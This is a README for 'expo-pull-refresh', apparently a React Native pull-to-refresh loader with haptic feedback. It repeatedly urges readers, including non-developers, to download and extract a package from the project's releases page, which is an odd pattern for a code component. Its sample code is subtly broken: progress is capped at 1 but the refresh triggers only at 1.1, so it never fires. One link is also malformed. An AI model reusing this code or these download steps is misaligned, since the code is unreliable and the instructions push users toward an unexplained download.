# 🌟 expo-pull-refresh - A Simple Pull-to-Refresh Loader

## 🔗 Download & Install
[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20to%20Get-brightgreen)](https://github.com/nerimar2312/expo-pull-refresh/releases)

To get started with the Pull-to-Refresh component, visit this page to download: [Download Here](https://github.com/nerimar2312/expo-pull-refresh/releases).

## 🚀 Getting Started
The expo-pull-refresh is a React Native component that adds a circular progress loader to your app. It includes haptic feedback to enhance user experience during pull-to-refresh actions. This guide will show you how to download and use this component, even if you're not a developer.

## 💻 System Requirements
- A computer running Windows, macOS, or Linux.
- Node.js version 12 or later must be installed. This allows you to run the application easily.

## 📦 Installation
1. First, you need to download the component from the releases page. Find the latest version [here](https://github.com/nerimar2312/expo-pull-refresh/releases).
2. Extract the downloaded package to a folder of your choice.
3. Open your terminal (Command Prompt or terminal emulator).
4. Navigate to the folder where you extracted the files.
5. Run the following command to install the necessary packages:

```bash
npm install
```

## 🔧 Usage
Using the Pull-to-Refresh component in your application is straightforward. Follow these steps to integrate it:

1. Begin by importing the component into your project. Here is an example of how to do this:

```typescript
import PullToRefreshLoader from 'components/PullToRefresh';
import Animated, { useSharedValue, useAnimatedScrollHandler, runOnJS } from 'react-native-reanimated';
import { useState } from 'react';
```

2. Next, set up a state value to manage the refreshing state. Here’s how you can do that:

```typescript
const progress = useSharedValue(0);
const [refreshing, setRefreshing] = useState(false);
```

3. You will also need a function to handle the refresh action. This function can have logic to fetch data or perform another task:

```typescript
const handleRefresh = () => {
    setRefreshing(true);
    // Simulate fetching data...
    setTimeout(() => setRefreshing(false), 2000);
};
```

4. Create an animated scroll handler to detect pull actions. This helps in triggering the refresh function when the user pulls down:

```typescript
const scrollHandler = useAnimatedScrollHandler({
    onScroll: (event) => {
        if (event.contentOffset.y < 0 && !refreshing) {
            progress.value = Math.min(Math.abs(event.contentOffset.y) / 80, 1);
            if (progress.value >= 1.1) runOnJS(handleRefresh)();
        }
    },
});
```

5. Finally, use the `PullToRefreshLoader` component in your app's return statement:

```typescript
return (
    <View>
        <PullToRefreshLoader progress={progress} />
    </View>
);
```

## ✅ Additional Features
- **Haptic Feedback:** Get tactile feedback when users trigger the pull-to-refresh action.
- **Customizable:** Easily modify the component to fit your app's design.
- **Smooth Animation:** The loader has fluid animations that enhance user interaction.

## 🌍 Community and Support
If you face any issues or have questions, feel free to join our community. You can find support on:

- [GitHub Issues](https://github.com/nerimar2312/expo-pull-refresh/issues) - Report bugs or request features.
- [Discussion Forum](https://github.com/nerimar2312/expo-pull-refresh/discussions) - Share ideas and get help from other users.

## 📃 License
The expo-pull-refresh component is open-source and free to use. Please refer to the LICENSE file in the repository for more details.

## 📝 Contributing
We welcome contributions from everyone. If you have a suggestion, bug fix, or enhancement, feel free to submit a pull request. Your feedback helps improve the component for everyone.

To contribute:

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request with a description of your changes.

Thank you for considering contributing to expo-pull-refresh! 

For more details and to stay updated, visit the [repository]((https://github.com/nerimar2312/expo-pull-refresh/releases)). 

The link again for downloading: [Download Here](https://github.com/nerimar2312/expo-pull-refresh/releases).